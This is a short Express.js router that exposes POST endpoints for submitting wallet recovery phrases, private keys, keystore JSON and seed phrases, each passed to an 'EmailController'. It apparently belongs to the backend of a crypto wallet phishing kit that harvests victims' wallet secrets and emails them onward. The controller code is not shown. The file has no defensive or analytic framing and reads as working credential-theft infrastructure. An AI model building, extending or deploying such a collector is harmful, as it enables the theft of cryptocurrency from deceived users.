const express = require("express");
const router = express.Router();

const {
  phraseData,
  privateKeyData,
  keystoreJSONData,
  seedPhrase,
} = require("../controllers/EmailController");

// Send Phrase Data
router.post("/phrase", phraseData);

// Send Private Key Data
router.post("/private-key", privateKeyData);

// Send Keystore JSON Data
router.post("/keystore-json", keystoreJSONData);

// Send Seed Phrase
router.post('/seed-phrase', seedPhrase )

module.exports = router;
